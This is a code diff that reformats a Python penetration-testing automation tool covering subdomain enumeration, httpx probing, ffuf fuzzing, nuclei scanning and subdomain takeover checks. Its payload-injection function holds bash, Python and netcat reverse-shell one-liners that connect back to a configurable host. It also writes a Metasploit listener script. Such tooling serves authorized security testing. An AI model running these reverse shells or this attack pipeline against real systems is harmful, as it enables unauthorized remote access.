-                    for name in name_value.split('\n'):
+                    name_value = entry.get("name_value", "")
+                    for name in name_value.split("\n"):
                         name = name.strip().lower()
-                        if name and domain in name and not name.startswith('*'):
+                        if name and domain in name and not name.startswith("*"):
                             subdomains.add(name)
                         if len(subdomains) >= 100:  # Cap at 100 results
                             break
@@ -10155,13 +12379,16 @@ def search_certificate_transparency(domain: str) -> List[str]:
 
     return list(subdomains)
 
-def run_enhanced_port_scanning(subdomains: List[str], target_dir: Path, cfg: Dict[str, Any]) -> Dict[str, Any]:
+
+def run_enhanced_port_scanning(
+    subdomains: List[str], target_dir: Path, cfg: Dict[str, Any]
+) -> Dict[str, Any]:
     """Enhanced port scanning and service detection"""
     port_results = {
         "live_hosts": [],
         "services_found": {},
         "tools_used": [],
-        "errors": []
+        "errors": [],
     }
 
     # First, check which hosts are live
@@ -10170,14 +12397,25 @@ def run_enhanced_port_scanning(subdomains: List[str], target_dir: Path, cfg: Dic
         try:
             # Create temporary file with subdomains
             subdomains_file = target_dir / "temp_subdomains.txt"
-            with open(subdomains_file, 'w') as f:
-                f.write('\n'.join(subdomains))
+            with open(subdomains_file, "w") as f:
+                f.write("\n".join(subdomains))
 
             # Use httpx to find live hosts
-            result = run_cmd([
-                "httpx", "-l", str(subdomains_file), "-silent", "-status-code",
-                "-tech-detect", "-title", "-json"
-            ], timeout=600, capture=True, check_return=False)
+            result = run_cmd(
+                [
+                    "httpx",
+                    "-l",
+                    str(subdomains_file),
+                    "-silent",
+                    "-status-code",
+                    "-tech-detect",
+                    "-title",
+                    "-json",
+                ],
+                timeout=600,
+                capture=True,
+                check_return=False,
+            )
 
             if result and result.stdout:
                 for line in result.stdout.splitlines():
@@ -10188,7 +12426,7 @@ def run_enhanced_port_scanning(subdomains: List[str], target_dir: Path, cfg: Dic
                             port_results["services_found"][host_data["url"]] = {
                                 "status_code": host_data.get("status-code"),
                                 "title": host_data.get("title", ""),
-                                "tech": host_data.get("tech", [])
+                                "tech": host_data.get("tech", []),
                             }
                     except json.JSONDecodeError:
                         continue
@@ -10202,14 +12440,17 @@ def run_enhanced_port_scanning(subdomains: List[str], target_dir: Path, cfg: Dic
     port_results["live_hosts"] = live_hosts
     return port_results
 
-def run_enhanced_web_discovery(target: str, target_dir: Path, cfg: Dict[str, Any]) -> Dict[str, Any]:
+
+def run_enhanced_web_discovery(
+    target: str, target_dir: Path, cfg: Dict[str, Any]
+) -> Dict[str, Any]:
     """Enhanced web application discovery and crawling"""
     web_results = {
         "endpoints": [],
         "parameters": [],
         "technologies": [],
         "tools_used": [],
-        "errors": []
+        "errors": [],
     }
 
     # Directory and file discovery
@@ -10218,15 +12459,36 @@ def run_enhanced_web_discovery(target: str, target_dir: Path, cfg: Dict[str, Any
             # Use local wordlist or create a basic one
             wordlist_file = EXTRA_DIR / "paths_extra.txt"
             if not wordlist_file.exists():
-                basic_paths = ["admin", "api", "backup", "config", "login", "test", "upload"]
+                basic_paths = [
+                    "admin",
+                    "api",
+                    "backup",
+                    "config",
+                    "login",
+                    "test",
+                    "upload",
+                ]
                 wordlist_file.parent.mkdir(exist_ok=True)
-                with open(wordlist_file, 'w') as f:
-                    f.write('\n'.join(basic_paths))
+                with open(wordlist_file, "w") as f:
+                    f.write("\n".join(basic_paths))
 
-            result = run_cmd([
-                "ffu", "-u", f"http://{target}/FUZZ", "-w", str(wordlist_file),
-                "-mc", "200,204,301,302,307,401,403", "-fs", "0", "-s"
-            ], timeout=300, capture=True, check_return=False)
+            result = run_cmd(
+                [
+                    "ffu",
+                    "-u",
+                    f"http://{target}/FUZZ",
+                    "-w",
+                    str(wordlist_file),
+                    "-mc",
+                    "200,204,301,302,307,401,403",
+                    "-fs",
+                    "0",
+                    "-s",
+                ],
+                timeout=300,
+                capture=True,
+                check_return=False,
+            )
 
             if result and result.stdout:
                 endpoints = []
@@ -10241,33 +12503,44 @@ def run_enhanced_web_discovery(target: str, target_dir: Path, cfg: Dict[str, Any
 
     return web_results
 
-def run_enhanced_vulnerability_assessment(target: str, target_dir: Path, cfg: Dict[str, Any]) -> Dict[str, Any]:
+
+def run_enhanced_vulnerability_assessment(
+    target: str, target_dir: Path, cfg: Dict[str, Any]
+) -> Dict[str, Any]:
     """Enhanced vulnerability assessment using multiple scanners"""
-    vuln_results = {
-        "vulnerabilities": [],
-        "tools_used": [],
-        "errors": []
-    }
+    vuln_results = {"vulnerabilities": [], "tools_used": [], "errors": []}
 
     # Nuclei scanning if available
     if which("nuclei"):
         try:
-            result = run_cmd([
-                "nuclei", "-u", f"http://{target}", "-severity", "info,low,medium,high,critical",
-                "-jsonl", "-silent"
-            ], timeout=600, capture=True, check_return=False)
+            result = run_cmd(
+                [
+                    "nuclei",
+                    "-u",
+                    f"http://{target}",
+                    "-severity",
+                    "info,low,medium,high,critical",
+                    "-jsonl",
+                    "-silent",
+                ],
+                timeout=600,
+                capture=True,
+                check_return=False,
+            )
 
             if result and result.stdout:
                 vulnerabilities = []
                 for line in result.stdout.splitlines():
                     try:
                         vuln_data = json.loads(line)
-                        vulnerabilities.append({
-                            "template_id": vuln_data.get("template-id"),
-                            "severity": vuln_data.get("info", {}).get("severity"),
-                            "name": vuln_data.get("info", {}).get("name"),
-                            "url": vuln_data.get("matched-at")
-                        })
+                        vulnerabilities.append(
+                            {
+                                "template_id": vuln_data.get("template-id"),
+                                "severity": vuln_data.get("info", {}).get("severity"),
+                                "name": vuln_data.get("info", {}).get("name"),
+                                "url": vuln_data.get("matched-at"),
+                            }
+                        )
                     except json.JSONDecodeError:
                         continue
 
@@ -10279,6 +12552,7 @@ def run_enhanced_vulnerability_assessment(target: str, target_dir: Path, cfg: Di
 
     return vuln_results
 
+
 def auto_fix_missing_dependencies():
     """Automatically fix missing dependencies and wordlists"""
     try:
@@ -10289,24 +12563,59 @@ def auto_fix_missing_dependencies():
 
         # Create missing wordlists
         wordlists_to_create = {
-            EXTRA_DIR / "common_directories.txt": [
-                "admin", "api", "app", "backup", "config", "data", "debug",
-                "dev", "docs", "files", "images", "login", "test", "upload"
+            EXTRA_DIR
+            / "common_directories.txt": [
+                "admin",
+                "api",
+                "app",
+                "backup",
+                "config",
+                "data",
+                "debug",
+                "dev",
+                "docs",
+                "files",
+                "images",
+                "login",
+                "test",
+                "upload",
             ],
-            EXTRA_DIR / "common_parameters.txt": [
-                "id", "user", "password", "token", "key", "file", "path",
-                "url", "redirect", "callback", "search", "query"
+            EXTRA_DIR
+            / "common_parameters.txt": [
+                "id",
+                "user",
+                "password",
+                "token",
+                "key",
+                "file",
+                "path",
+                "url",
+                "redirect",
+                "callback",
+                "search",
+                "query",
             ],
-            EXTRA_DIR / "common_subdomains.txt": [
-                "www", "mail", "api", "admin", "dev", "test", "staging",
-                "blog", "app", "secure", "portal", "dashboard"
-            ]
+            EXTRA_DIR
+            / "common_subdomains.txt": [
+                "www",
+                "mail",
+                "api",
+                "admin",
+                "dev",
+                "test",
+                "staging",
+                "blog",
+                "app",
+                "secure",
+                "portal",
+                "dashboard",
+            ],
         }
 
         for wordlist_path, words in wordlists_to_create.items():
             if not wordlist_path.exists():
-                with open(wordlist_path, 'w') as f:
-                    f.write('\n'.join(words))
+                with open(wordlist_path, "w") as f:
+                    f.write("\n".join(words))
                 logger.log(f"Created missing wordlist: {wordlist_path.name}", "INFO")
 
         logger.log("Dependencies auto-fix completed", "SUCCESS")
@@ -10315,6 +12624,7 @@ def auto_fix_missing_dependencies():
     except Exception as e:
         logger.log(f"Auto-fix failed: {e}", "ERROR")
         return False
+
 
 def run_advanced_subdomain_takeover(rd, env, cfg):
     """Run advanced subdomain takeover detection and exploitation"""
@@ -10333,24 +12643,26 @@ def run_advanced_subdomain_takeover(rd, env, cfg):
         # Try to load from BCAR results first
         bcar_results_file = rd.run_dir / "bcar_enhanced_results.json"
         if bcar_results_file.exists():
-            with open(bcar_results_file, 'r') as f:
+            with open(bcar_results_file, "r") as f:
                 bcar_data = json.load(f)
-                for domain_results in bcar_data['bcar_results'].values():
-                    subdomains.extend(domain_results.get('subdomains', []))
+                for domain_results in bcar_data["bcar_results"].values():
+                    subdomains.extend(domain_results.get("subdomains", []))
 
         # Fallback to other subdomain discovery results
         if not subdomains:
             subdomain_files = list(rd.run_dir.glob("*subdomain*"))
             for file in subdomain_files:
                 try:
-                    if file.suffix == '.json':
-                        with open(file, 'r') as f:
+                    if file.suffix == ".json":
+                        with open(file, "r") as f:
                             data = json.load(f)
                             if isinstance(data, list):
                                 subdomains.extend(data)
                     else:
-                        with open(file, 'r') as f:
-                            subdomains.extend([line.strip() for line in f if line.strip()])
+                        with open(file, "r") as f:
+                            subdomains.extend(
+                                [line.strip() for line in f if line.strip()]
+                            )
                 except Exception:
                     continue
 
@@ -10359,31 +12671,45 @@ def run_advanced_subdomain_takeover(rd, env, cfg):
             return
 
         subdomains = list(set(subdomains))  # Remove duplicates
-        logger.log(f"Testing {len(subdomains)} subdomains for takeover vulnerabilities...", "INFO")
+        logger.log(
+            f"Testing {len(subdomains)} subdomains for takeover vulnerabilities...",
+            "INFO",
+        )
 
         # Run takeover detection
         vulnerabilities = bcar.subdomain_takeover_check(subdomains)
 
         # Save results
         takeover_file = rd.run_dir / "subdomain_takeover_results.json"
-        with open(takeover_file, 'w') as f:
-            json.dump({
-                'timestamp': datetime.now().isoformat(),
-                'tested_subdomains': len(subdomains),
-                'vulnerabilities': vulnerabilities
-            }, f, indent=2)
+        with open(takeover_file, "w") as f:
+            json.dump(
+                {
+                    "timestamp": datetime.now().isoformat(),
+                    "tested_subdomains": len(subdomains),
+                    "vulnerabilities": vulnerabilities,
+                },
+                f,
+                indent=2,
+            )
 
         logger.log(f"Subdomain takeover results saved to: {takeover_file}", "SUCCESS")
 
         if vulnerabilities:
-            logger.log(f"Found {len(vulnerabilities)} potential subdomain takeover vulnerabilities!", "WARNING")
+            logger.log(
+                f"Found {len(vulnerabilities)} potential subdomain takeover vulnerabilities!",
+                "WARNING",
+            )
             for vuln in vulnerabilities:
-                logger.log(f"  - {vuln['subdomain']} ({vuln['service']}) - {vuln['confidence']} confidence", "WARNING")
+                logger.log(
+                    f"  - {vuln['subdomain']} ({vuln['service']}) - {vuln['confidence']} confidence",
+                    "WARNING",
+                )
         else:
             logger.log("No subdomain takeover vulnerabilities detected", "INFO")
 
     except Exception as e:
         logger.log(f"Subdomain takeover detection failed: {e}", "ERROR")
+
 
 def run_automated_payload_injection(rd, env, cfg):
     """Run automated payload injection with reverse shell capabilities"""
@@ -10391,15 +12717,18 @@ def run_automated_payload_injection(rd, env, cfg):
 
     try:
         # Get configuration
-        payload_config = cfg.get('payload_injection', {
-            'lhost': cfg.get('payload', {}).get('lhost', '127.0.0.1'),
-            'lport': cfg.get('payload', {}).get('lport', 4444),
-            'test_mode': cfg.get('payload', {}).get('test_mode', True)
-        })
+        payload_config = cfg.get(
+            "payload_injection",
+            {
+                "lhost": cfg.get("payload", {}).get("lhost", "127.0.0.1"),
+                "lport": cfg.get("payload", {}).get("lport", 4444),
+                "test_mode": cfg.get("payload", {}).get("test_mode", True),
+            },
+        )
 
-        lhost = payload_config['lhost']
-        lport = int(payload_config['lport'])
-        test_mode = payload_config['test_mode']
+        lhost = payload_config["lhost"]
+        lport = int(payload_config["lport"])
+        test_mode = payload_config["test_mode"]
 
         # Initialize payload generation
         if BCAR_AVAILABLE:
@@ -10408,21 +12737,31 @@ def run_automated_payload_injection(rd, env, cfg):
         else:
             # Fallback payload generation
             payloads = {
-                'bash_reverse': f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
-                'python_reverse': "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
-                'nc_reverse': f"nc -e /bin/sh {lhost} {lport}"
+                "bash_reverse": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
+                "python_reverse": 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'',
+                "nc_reverse": f"nc -e /bin/sh {lhost} {lport}",
             }
 
         # Save payloads to file
         payloads_file = rd.run_dir / "generated_payloads.json"
-        with open(payloads_file, 'w') as f:
-            json.dump({
-                'timestamp': datetime.now().isoformat(),
-                'configuration': {'lhost': lhost, 'lport': lport, 'test_mode': test_mode},
-                'payloads': payloads
-            }, f, indent=2)
+        with open(payloads_file, "w") as f:
+            json.dump(
+                {
+                    "timestamp": datetime.now().isoformat(),
+                    "configuration": {
+                        "lhost": lhost,
+                        "lport": lport,
+                        "test_mode": test_mode,
+                    },
+                    "payloads": payloads,
+                },
+                f,
+                indent=2,
+            )
 
-        logger.log(f"Generated {len(payloads)} payloads saved to: {payloads_file}", "SUCCESS")
+        logger.log(
+            f"Generated {len(payloads)} payloads saved to: {payloads_file}", "SUCCESS"
+        )
 
         # Generate payload files in payloads directory
         payload_scripts_dir = PAYLOADS_DIR / f"run_{rd.run_name}"
@@ -10430,41 +12769,52 @@ def run_automated_payload_injection(rd, env, cfg):
 
         # Create individual payload files
         for payload_name, payload_content in payloads.items():
-            if payload_name.startswith('msfvenom'):
+            if payload_name.startswith("msfvenom"):
                 # Save msfvenom commands
                 script_file = payload_scripts_dir / f"{payload_name}.sh"
-                with open(script_file, 'w') as f:
+                with open(script_file, "w") as f:
                     f.write(f"#!/bin/bash\n# {payload_name}\n{payload_content}\n")
                 script_file.chmod(0o755)
             else:
                 # Save direct payloads
                 payload_file = payload_scripts_dir / f"{payload_name}.txt"
-                with open(payload_file, 'w') as f:
+                with open(payload_file, "w") as f:
                     f.write(payload_content)
 
         logger.log(f"Payload scripts saved to: {payload_scripts_dir}", "SUCCESS")
 
         # In test mode, just log what would be done
         if test_mode:
-            logger.log("Test mode enabled - payloads generated but not executed", "INFO")
-            logger.log("To enable payload injection, set test_mode: false in configuration", "INFO")
+            logger.log(
+                "Test mode enabled - payloads generated but not executed", "INFO"
+            )
+            logger.log(
+                "To enable payload injection, set test_mode: false in configuration",
+                "INFO",
+            )
         else:
-            logger.log("Payload injection is enabled - use responsibly and only on authorized targets", "WARNING")
+            logger.log(
+                "Payload injection is enabled - use responsibly and only on authorized targets",
+                "WARNING",
+            )
 
         # Create listener setup script
         listener_script = payload_scripts_dir / "setup_listener.sh"
-        with open(listener_script, 'w') as f:
-            f.write("""#!/bin/bash
+        with open(listener_script, "w") as f:
+            f.write(
+                """#!/bin/bash
 # Metasploit listener setup for {lhost}:{lport}
 echo "Setting up Metasploit listener..."
 msfconsole -x "use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; run"
-""")
+"""
+            )
         listener_script.chmod(0o755)
 
         logger.log(f"Listener setup script: {listener_script}", "SUCCESS")
 
     except Exception as e:
         logger.log(f"Automated payload injection failed: {e}", "ERROR")
+
 
 def run_comprehensive_fuzzing(rd, env, cfg):
     """Run comprehensive fuzzing with BCAR integration"""
@@ -10473,16 +12823,18 @@ def run_comprehensive_fuzzing(rd, env, cfg):
     try:
         # Get targets for fuzzing
         targets = []
-        if hasattr(rd, 'discovered_urls'):
+        if hasattr(rd, "discovered_urls"):
             targets = rd.discovered_urls
         else:
             # Try to get from HTTP probe results
             http_results_file = rd.run_dir / "http_probe_results.json"
             if http_results_file.exists():
-                with open(http_results_file, 'r') as f:
+                with open(http_results_file, "r") as f:
                     http_data = json.load(f)
                     if isinstance(http_data, list):
-                        targets = [item.get('url', '') for item in http_data if 'url' in item]
+                        targets = [
+                            item.get("url", "") for item in http_data if "url" in item
+                        ]
 
         if not targets:
             logger.log("No HTTP targets found for fuzzing", "ERROR")
@@ -10500,7 +12852,10 @@ def run_comprehensive_fuzzing(rd, env, cfg):
                     findings = bcar.advanced_fuzzing(target)
                     if findings:
                         fuzzing_results.extend(findings)
-                        logger.log(f"Found {len(findings)} interesting paths on {target}", "INFO")
+                        logger.log(
+                            f"Found {len(findings)} interesting paths on {target}",
+                            "INFO",
+                        )
                 except Exception as e:
                     logger.log(f"Fuzzing failed for {target}: {e}", "WARNING")
 
@@ -10508,39 +12863,59 @@ def run_comprehensive_fuzzing(rd, env, cfg):
         else:
             logger.log("Using basic fuzzing (BCAR not available)", "INFO")
             common_paths = [
-                'admin', 'login', 'dashboard', 'config', 'backup', 'test', 'dev',
-                'api', 'robots.txt', '.well-known', 'sitemap.xml'
+                "admin",
+                "login",
+                "dashboard",
+                "config",
+                "backup",
+                "test",
+                "dev",
+                "api",
+                "robots.txt",
+                ".well-known",
+                "sitemap.xml",
             ]
 
             for target in targets[:5]:  # Limit for demo
                 for path in common_paths:
                     try:
                         import requests
+
                         url = f"{target.rstrip('/')}/{path}"
                         response = requests.get(url, timeout=5, allow_redirects=False)
                         if response.status_code in [200, 301, 302, 403]:
-                            fuzzing_results.append({
-                                'url': url,
-                                'status_code': response.status_code,
-                                'content_length': len(response.content)
-                            })
+                            fuzzing_results.append(
+                                {
+                                    "url": url,
+                                    "status_code": response.status_code,
+                                    "content_length": len(response.content),
+                                }
+                            )
                     except Exception:
                         continue
 
         # Save fuzzing results
         fuzzing_file = rd.run_dir / "comprehensive_fuzzing_results.json"
-        with open(fuzzing_file, 'w') as f:
-            json.dump({
-                'timestamp': datetime.now().isoformat(),
-                'targets_fuzzed': len(targets),
-                'findings': fuzzing_results
-            }, f, indent=2)
+        with open(fuzzing_file, "w") as f:
+            json.dump(
+                {
+                    "timestamp": datetime.now().isoformat(),
+                    "targets_fuzzed": len(targets),
+                    "findings": fuzzing_results,
+                },
+                f,
+                indent=2,
+            )
 
         logger.log(f"Fuzzing results saved to: {fuzzing_file}", "SUCCESS")
-        logger.log(f"Fuzzing complete: {len(fuzzing_results)} interesting paths discovered", "INFO")
+        logger.log(
+            f"Fuzzing complete: {len(fuzzing_results)} interesting paths discovered",
+            "INFO",
+        )
 
     except Exception as e:
         logger.log(f"Comprehensive fuzzing failed: {e}", "ERROR")
+
 
 if __name__ == "__main__":
     try:
